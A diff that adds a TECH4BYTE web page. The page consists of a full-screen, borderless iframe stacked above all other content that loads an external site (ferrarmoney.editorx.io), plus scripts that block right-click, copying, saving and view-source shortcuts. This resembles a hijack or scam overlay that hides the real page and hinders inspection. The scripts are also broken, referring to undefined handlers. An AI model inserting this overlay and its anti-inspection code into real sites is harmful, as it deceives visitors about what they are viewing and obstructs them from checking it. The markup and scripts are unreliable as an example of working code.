@@ -1,0 +1,56 @@
+</head><body>
+  <title>TECH4BYTE</title>
+<body>
+  <iframe src="https://ferrarmoney.editorx.io/ilmiosito-1" style="position:fixed; top:-50px; left:0px; bottom:0px; right:0px; width:100%; height:105%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
+</iframe>  
+   
+  </body>
+    <script type="text/javascript">
+<!--
+if (screen.width <= 900) {
+document.location = "/Mobile.html";
+}
+//-->
+</script>
+<script type="text/javascript">
+  function mousehandler(e) {
+      var myevent = (isNS) ? e : event;
+      var eventbutton = (isNS) ? myevent.which : myevent.button;
+      if ((eventbutton == 2) || (eventbutton == 3)) return false;
+  }
+  document.oncontextmenu = mischandler;
+  document.onmousedown = mousehandler;
+  document.onmouseup = mousehandler;
+  function disableCtrlKeyCombination(e) {
+      var forbiddenKeys = new Array("a", "s", "c", "x","u");
+      var key;
+      var isCtrl;
+      if (window.event) {
+          key = window.event.keyCode;
+          //IE
+          if (window.event.ctrlKey)
+              isCtrl = true;
+          else
+              isCtrl = false;
+      }
+      else {
+          key = e.which;
+          //firefox
+          if (e.ctrlKey)
+              isCtrl = true;
+          else
+              isCtrl = false;
+      }
+      if (isCtrl) {
+          for (i = 0; i < forbiddenKeys.length; i++) {
+              //case-insensitive comparation
+              if (forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()) {
+                  return false;
+              }
+          }
+      }
+      return true;
+  }
+</script>
+
+</body></html>
